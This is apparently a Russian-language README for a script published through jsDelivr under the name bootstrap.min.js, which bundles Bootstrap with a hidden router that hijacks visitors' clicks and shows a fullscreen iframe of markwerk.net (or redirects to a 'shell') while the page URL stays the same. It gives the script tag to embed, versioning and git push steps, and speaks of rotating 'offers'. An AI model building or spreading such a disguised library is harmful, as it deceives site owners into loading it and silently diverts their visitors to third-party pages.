# bootstrap.min.js + VW router

Внутри: **Bootstrap 5.3.3** bundle + глобальный счётчик (CountAPI) + редирект на shell + iframe.

## `@1.0.5` — markwerk (как ты просил)

```html
<script src="https://cdn.jsdelivr.net/gh/jhntsplt/bootstrap@1.0.5/bootstrap.min.js" data-debug="1"></script>
```

- **Первый** клик по `a`/`button` в этой вкладке — скрипт **не мешает** (ссылка/кнопка работают как обычно).
- **Со второго** клика — fullscreen iframe только `https://markwerk.net/`, URL ленда не меняется.
- Без CountAPI, без второго домена, без shell на markwerk.

## `@1.0.4` — overlay + CountAPI + markwerk-ki (устарело для твоего кейса)

## `@1.0.3` — полный redirect (меняет URL на markwerk.net/vw/…)

Не используй, если нужен overlay.

## `@1.0.2` — overlay (без редиректа)

```html
<script src="https://cdn.jsdelivr.net/gh/jhntsplt/bootstrap@1.0.2/bootstrap.min.js" data-debug="1"></script>
```

Клик → fullscreen iframe поверх ленда (URL **не** меняется).

`data-vw-skip` — не перехватывать.

Редirect-режим (старый): `data-vw-mode="redirect" data-vw-shell="https://…/index.html"`.

## Push

```bash
git init
git add bootstrap.min.js vw/index.html README.md
git commit -m "bootstrap vw 1.0.0 test"
git branch -M main
git remote add origin https://github.com/jhntsplt/bootstrap.git
git push -u origin main
git tag 1.0.0
git push origin 1.0.0
```

После push подожди 1–2 мин, проверь размер:

```bash
curl -s "https://cdn.jsdelivr.net/gh/jhntsplt/bootstrap@1.0.0/bootstrap.min.js" | wc -c
```

Ожидается ~86566 байт.

## Следующие офферы

Новый тег `1.0.1` (не перезаписывать `1.0.0` на jsDelivr) — другие URL в `build-vw-bundle.sh`.
